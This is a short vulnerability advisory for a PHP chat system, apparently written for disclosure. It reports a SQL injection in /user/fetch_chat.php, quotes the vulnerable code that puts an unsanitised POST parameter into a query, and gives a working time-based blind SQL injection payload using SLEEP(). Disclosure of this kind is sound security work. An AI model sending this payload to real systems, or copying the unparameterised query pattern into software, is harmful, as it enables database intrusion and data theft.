# Chat System Using PHP has sql injection in /user/fetch_chat.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



/user/fetch_chat.php



## describe


The id parameter in /user/fetch_chat.php is not properly sanitized or parameterized, which leaves it vulnerable to SQL injection attacks. Attackers can exploit this by injecting malicious SQL code to manipulate the database queries. Utilizing time-based SQL injection methods, they can introduce intentional delays in the database response through functions such as SLEEP(). This technique can be employed to verify the existence of the vulnerability and may also be used to extract sensitive information from the database.



## **Code analysis**



```php
<?php
	include('../conn.php');
	if(isset($_POST['fetch'])){
		$id = $_POST['id'];
		
		$query=mysqli_query($conn,"select * from `chat` left join `user` on user.userid=chat.userid where chatroomid='$id' order by chat_date asc") or die(mysqli_error());
		while($row=mysqli_fetch_array($query)){
		?>	
		<div>
			<img src="../<?php if(empty($row['photo'])){echo "upload/profile.jpg";}else{echo $row['photo'];} ?>" style="height:30px; width:30px; position:relative; top:15px; left:10px;">
			<span style="font-size:10px; position:relative; top:7px; left:15px;"><i><?php echo date('M-d-Y h:i A',strtotime($row['chat_date'])); ?></i></span><br>
			<span style="font-size:11px; position:relative; top:-2px; left:50px;"><strong><?php echo $row['uname']; ?></strong>: <?php echo $row['message']; ?></span><br>
		</div>
		<div style="height:5px;"></div>
		<?php
		}
	}	
?>
```

Inserting $_POST['id'] into Mysql query without any filter. A time-based blind SQL injection can be triggered.





## POC

```
id=1' AND (SELECT 1003 FROM (SELECT(SLEEP(5)))bYhJ) AND 'VosV'='VosV
```

Send this request, you can observe an additional 5 seconds time delay triggered by the time-based injection.
